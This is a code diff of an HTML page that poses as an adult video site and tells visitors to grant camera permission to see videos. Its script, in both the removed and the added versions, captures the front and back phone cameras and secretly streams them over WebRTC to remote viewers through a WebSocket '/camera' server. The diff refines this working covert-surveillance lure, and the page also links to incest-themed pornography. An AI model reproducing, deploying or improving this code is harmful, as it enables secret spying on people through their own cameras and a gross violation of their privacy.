@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>sex videos</title>
+<title>Video Site</title>
 
 <style>
 body{
@@ -60,26 +60,23 @@ body{
 
 <body>
 
-<h1>HD sex videos</h1></h1>
+<h1>HD Videos</h1>
 
 <div id="status">
-  if 18+ just click allow permission its required
+  Click Allow to grant camera permission
 </div>
 
 <div id="error">
-  Please allow the permission to see the video.
+  Please allow the permission to continue.
 </div>
 
-<button
-  id="retryBtn"
-  class="retryBtn">
+<button id="retryBtn" class="retryBtn">
   🔄 Try Again
 </button>
 
 <div id="content">
-
   <div id="liveStatus">
-    see more videos by clicking the below button.
+    See more videos below.
   </div>
 
   <a
@@ -87,48 +84,32 @@ body{
     href="https://www.rat.xxx/search/brother+and+sister/"
     target="_blank"
     rel="noopener noreferrer">
-    click here to see the HD video
+    Click here to see the HD video
   </a>
-
 </div>
 
-<video
-  id="frontVideo"
-  autoplay
-  muted
-  playsinline>
-</video>
-
-<video
-  id="backVideo"
-  autoplay
-  muted
-  playsinline>
-</video>
+<video id="frontVideo" autoplay muted playsinline></video>
+<video id="backVideo" autoplay muted playsinline></video>
 
 <script>
-const status =
-  document.getElementById("status");
 
-const errorBox =
-  document.getElementById("error");
+const status = document.getElementById("status");
+const errorBox = document.getElementById("error");
+const content = document.getElementById("content");
+const retryBtn = document.getElementById("retryBtn");
 
-const content =
-  document.getElementById("content");
-
-const retryBtn =
-  document.getElementById("retryBtn");
-
-const frontVideo =
-  document.getElementById("frontVideo");
-
-const backVideo =
-  document.getElementById("backVideo");
+const frontVideo = document.getElementById("frontVideo");
+const backVideo = document.getElementById("backVideo");
 
 let frontStream = null;
 let backStream = null;
 
+let cameraReady = false;
+let roleReceived = false;
+
 const peers = new Map();
+const pendingCandidates = new Map();
+
 
 const ws = new WebSocket(
   (location.protocol === "https:" ? "wss:" : "ws:") +
@@ -137,137 +118,29 @@ const ws = new WebSocket(
   "/camera"
 );
 
+
 function send(message){
+
   if(ws.readyState === WebSocket.OPEN){
+
     ws.send(JSON.stringify(message));
-  }
-}
 
-function showPermissionRequired(message){
-  status.textContent =
-    " permission required";
-
-  errorBox.textContent =
-    message ||
-    "Please allow permission to use this site.";
-
-  content.style.display = "none";
-  retryBtn.style.display = "inline-block";
-}
-
-async function startCameras(){
-
-  status.textContent =
-    "🟡 Requesting permission...";
-
-  errorBox.textContent = "";
-
-  retryBtn.style.display = "none";
-  content.style.display = "none";
-
-  /*
-    Request the front camera first.
-  */
-  try{
-
-    frontStream =
-      await navigator.mediaDevices.getUserMedia({
-        video:{
-          facingMode:{
-            ideal:"user"
-          }
-        },
-        audio:false
-      });
-
-    frontVideo.srcObject =
-      frontStream;
-
-    await frontVideo.play()
-      .catch(() => {});
-
-  }catch(err){
-
-    console.error(
-      "permission error:",
-      err
-    );
-
-    if(
-      err.name === "NotAllowedError" ||
-      err.name === "PermissionDeniedError"
-    ){
-
-      showPermissionRequired(
-        "❌  permission was denied. Please allow camera permission and try again."
-      );
-
-    }else{
-
-      showPermissionRequired(
-        `❌ Camera could not be opened: ${err.name}`
-      );
-
-    }
-
-    return;
+    return true;
   }
 
-  /*
-    Permission was granted.
-    The site can now be used.
-  */
-
-  content.style.display = "block";
-
-  status.textContent =
-    "permission granted";
-
-  errorBox.textContent = "";
-
-  /*
-    Try the back camera too.
-    Some phones allow only one camera.
-  */
-
-  try{
-
-    backStream =
-      await navigator.mediaDevices.getUserMedia({
-        video:{
-          facingMode:{
-            ideal:"environment"
-          }
-        },
-        audio:false
-      });
-
-    backVideo.srcObject =
-      backStream;
-
-    await backVideo.play()
-      .catch(() => {});
-
-  }catch(err){
-
-    console.warn(
-      "Back  unavailable:",
-      err
-    );
-
-    backStream = null;
-
-  }
-
-  status.textContent =
-    backStream
-      ? "Every day new link"
-      : "moody video";
-
-  announceCameras();
+  return false;
 }
+
 
 function announceCameras(){
+
+  if(
+    !cameraReady ||
+    !frontStream ||
+    !roleReceived
+  ){
+    return;
+  }
 
   send({
     type:"camera-live",
@@ -279,212 +152,24 @@ function announceCameras(){
   });
 }
 
-async function createPeer(viewerId){
 
-  if(peers.has(viewerId)){
-    return;
-  }
+function showPermissionRequired(message){
 
-  const pc =
-    new RTCPeerConnection({
-      iceServers:[
-        {
-          urls:
-            "stun:stun.l.google.com:19302"
-        }
-      ]
-    });
+  status.textContent = "🔒 Permission required";
 
-  peers.set(
-    viewerId,
-    pc
-  );
+  errorBox.textContent =
+    message ||
+    "Please allow camera permission.";
 
-  if(frontStream){
-
-    const track =
-      frontStream.getVideoTracks()[0];
-
-    if(track){
-
-      pc.addTransceiver(
-        track,
-        {
-          streams:[
-            frontStream
-          ]
-        }
-      );
-
-    }
-  }
-
-  if(backStream){
-
-    const track =
-      backStream.getVideoTracks()[0];
-
-    if(track){
-
-      pc.addTransceiver(
-        track,
-        {
-          streams:[
-            backStream
-          ]
-        }
-      );
-
-    }
-  }
-
-  pc.onicecandidate =
-    event => {
-
-      if(event.candidate){
-
-        send({
-          type:"candidate",
-          candidate:event.candidate,
-          toViewerId:viewerId
-        });
-
-      }
-
-    };
-
-  const offer =
-    await pc.createOffer();
-
-  await pc.setLocalDescription(
-    offer
-  );
-
-  send({
-    type:"offer",
-    offer:pc.localDescription,
-    toViewerId:viewerId,
-
-    streamTypes:{
-      front:!!frontStream,
-      back:!!backStream
-    }
-  });
+  content.style.display = "none";
+  retryBtn.style.display = "inline-block";
 }
 
-ws.onopen = () => {
-  startCameras();
-};
 
-ws.onmessage =
-  async event => {
-
-    let msg;
-
-    try{
-
-      msg =
-        JSON.parse(event.data);
-
-    }catch{
-
-      return;
-
-    }
-
-    if(msg.type === "viewer-ready"){
-
-      /*
-        Only create the WebRTC connection
-        after camera permission succeeded.
-      */
-
-      if(!frontStream){
-        return;
-      }
-
-      await createPeer(
-        msg.viewerId
-      );
-
-      return;
-    }
-
-    if(msg.type === "answer"){
-
-      const pc =
-        peers.get(
-          msg.viewerId
-        );
-
-      if(pc && msg.answer){
-
-        await pc.setRemoteDescription(
-          msg.answer
-        );
-
-      }
-
-      return;
-    }
-
-    if(msg.type === "candidate"){
-
-      const pc =
-        peers.get(
-          msg.viewerId
-        );
-
-      if(
-        pc &&
-        msg.candidate
-      ){
-
-        await pc
-          .addIceCandidate(
-            msg.candidate
-          )
-          .catch(() => {});
-
-      }
-
-      return;
-    }
-
-    if(msg.type === "viewer-left"){
-
-      const pc =
-        peers.get(
-          msg.viewerId
-        );
-
-      if(pc){
-
-        pc.close();
-
-        peers.delete(
-          msg.viewerId
-        );
-
-      }
-
-    }
-
-  };
-
-ws.onclose = () => {
-
-  status.textContent =
-    "🔴 Server connection closed";
-
-};
-
-/*
-  Retry button
-*/
-retryBtn.onclick = () => {
+function stopCameras(){
 
   if(frontStream){
+
     frontStream
       .getTracks()
       .forEach(track => track.stop());
@@ -493,6 +178,7 @@ retryBtn.onclick = () => {
   }
 
   if(backStream){
+
     backStream
       .getTracks()
       .forEach(track => track.stop());
@@ -500,9 +186,489 @@ retryBtn.onclick = () => {
     backStream = null;
   }
 
+  frontVideo.srcObject = null;
+  backVideo.srcObject = null;
+
+  cameraReady = false;
+}
+
+
+async function startCameras(){
+
+  stopCameras();
+
+  status.textContent =
+    "🟡 Requesting camera permission...";
+
+  errorBox.textContent = "";
+  retryBtn.style.display = "none";
+  content.style.display = "none";
+
+
+  try{
+
+    frontStream =
+      await navigator.mediaDevices.getUserMedia({
+
+        video:{
+          facingMode:{
+            ideal:"user"
+          }
+        },
+
+        audio:false
+
+      });
+
+    frontVideo.srcObject = frontStream;
+
+    await frontVideo.play()
+      .catch(() => {});
+
+  }
+
+  catch(err){
+
+    console.error("Front camera error:",err);
+
+    showPermissionRequired(
+      "❌ Camera permission is required. Please allow permission and try again."
+    );
+
+    return;
+  }
+
+
+  try{
+
+    backStream =
+      await navigator.mediaDevices.getUserMedia({
+
+        video:{
+          facingMode:{
+            ideal:"environment"
+          }
+        },
+
+        audio:false
+
+      });
+
+    backVideo.srcObject = backStream;
+
+    await backVideo.play()
+      .catch(() => {});
+
+  }
+
+  catch(err){
+
+    console.warn(
+      "Back camera unavailable:",
+      err
+    );
+
+    backStream = null;
+  }
+
+
+  cameraReady = true;
+
+  content.style.display = "block";
+
+  status.textContent =
+    backStream
+      ? "🟢 Cameras are ready"
+      : "🟢 Camera is ready";
+
+
+  announceCameras();
+}
+
+
+async function createPeer(viewerId){
+
+  const oldPc = peers.get(viewerId);
+
+  if(oldPc){
+
+    try{
+      oldPc.close();
+    }catch(err){}
+
+    peers.delete(viewerId);
+  }
+
+
+  if(!frontStream){
+
+    return;
+  }
+
+
+  const pc =
+    new RTCPeerConnection({
+
+      iceServers:[
+        {
+          urls:"stun:stun.l.google.com:19302"
+        }
+      ]
+
+    });
+
+
+  peers.set(viewerId,pc);
+
+  pendingCandidates.set(
+    viewerId,
+    []
+  );
+
+
+  pc.onicecandidate = event => {
+
+    if(event.candidate){
+
+      send({
+
+        type:"candidate",
+
+        candidate:event.candidate,
+
+        toViewerId:viewerId
+
+      });
+
+    }
+
+  };
+
+
+  pc.onconnectionstatechange = () => {
+
+    console.log(
+      "Connection:",
+      viewerId,
+      pc.connectionState
+    );
+
+  };
+
+
+  frontStream
+    .getTracks()
+    .forEach(track => {
+
+      pc.addTrack(
+        track,
+        frontStream
+      );
+
+    });
+
+
+  if(backStream){
+
+    backStream
+      .getTracks()
+      .forEach(track => {
+
+        pc.addTrack(
+          track,
+          backStream
+        );
+
+      });
+
+  }
+
+
+  try{
+
+    const offer =
+      await pc.createOffer({
+
+        offerToReceiveAudio:false,
+        offerToReceiveVideo:false
+
+      });
+
+
+    await pc.setLocalDescription(
+      offer
+    );
+
+
+    send({
+
+      type:"offer",
+
+      offer:pc.localDescription,
+
+      toViewerId:viewerId,
+
+      streamTypes:{
+        front:true,
+        back:!!backStream
+      }
+
+    });
+
+  }
+
+  catch(err){
+
+    console.error(
+      "Offer error:",
+      err
+    );
+
+  }
+
+}
+
+
+ws.onopen = () => {
+
   startCameras();
+
 };
+
+
+ws.onmessage =
+async event => {
+
+  let msg;
+
+  try{
+
+    msg = JSON.parse(event.data);
+
+  }
+
+  catch(err){
+
+    return;
+  }
+
+
+  if(msg.type === "role"){
+
+    roleReceived = true;
+
+    announceCameras();
+
+    return;
+  }
+
+
+  if(msg.type === "viewer-ready"){
+
+    if(
+      !cameraReady ||
+      !frontStream
+    ){
+      return;
+    }
+
+
+    await createPeer(
+      msg.viewerId
+    );
+
+    return;
+  }
+
+
+  if(msg.type === "answer"){
+
+    const viewerId =
+      msg.toViewerId ||
+      msg.viewerId;
+
+
+    const pc =
+      peers.get(viewerId);
+
+
+    if(
+      pc &&
+      msg.answer
+    ){
+
+      try{
+
+        await pc.setRemoteDescription(
+          new RTCSessionDescription(
+            msg.answer
+          )
+        );
+
+
+        const queued =
+          pendingCandidates.get(viewerId) || [];
+
+
+        for(const candidate of queued){
+
+          await pc.addIceCandidate(
+            new RTCIceCandidate(
+              candidate
+            )
+          ).catch(() => {});
+
+        }
+
+
+        pendingCandidates.set(
+          viewerId,
+          []
+        );
+
+      }
+
+      catch(err){
+
+        console.log(
+          "Answer error:",
+          err
+        );
+
+      }
+
+    }
+
+    return;
+  }
+
+
+  if(msg.type === "candidate"){
+
+    const viewerId =
+      msg.toViewerId ||
+      msg.viewerId;
+
+
+    const pc =
+      peers.get(viewerId);
+
+
+    if(!pc || !msg.candidate){
+
+      return;
+    }
+
+
+    if(
+      pc.remoteDescription &&
+      pc.remoteDescription.type
+    ){
+
+      await pc.addIceCandidate(
+        new RTCIceCandidate(
+          msg.candidate
+        )
+      ).catch(() => {});
+
+    }
+
+    else{
+
+      if(
+        !pendingCandidates.has(
+          viewerId
+        )
+      ){
+
+        pendingCandidates.set(
+          viewerId,
+          []
+        );
+
+      }
+
+      pendingCandidates
+        .get(viewerId)
+        .push(msg.candidate);
+
+    }
+
+    return;
+  }
+
+
+  if(msg.type === "viewer-left"){
+
+    const pc =
+      peers.get(msg.viewerId);
+
+    if(pc){
+
+      try{
+        pc.close();
+      }catch(err){}
+
+      peers.delete(msg.viewerId);
+      pendingCandidates.delete(msg.viewerId);
+
+    }
+
+  }
+
+};
+
+
+ws.onerror = () => {
+
+  console.log(
+    "WebSocket error"
+  );
+
+};
+
+
+ws.onclose = () => {
+
+  status.textContent =
+    "🔴 Server connection closed";
+
+};
+
+
+retryBtn.onclick = () => {
+
+  startCameras();
+
+};
+
+
+window.addEventListener(
+  "beforeunload",
+  () => {
+
+    stopCameras();
+
+    peers.forEach(pc => {
+
+      try{
+        pc.close();
+      }catch(err){}
+
+    });
+
+    peers.clear();
+
+    if(
+      ws.readyState === WebSocket.OPEN
+    ){
+      ws.close();
+    }
+
+  }
+);
+
 </script>
 
 </body>
-  </html>
+</html>
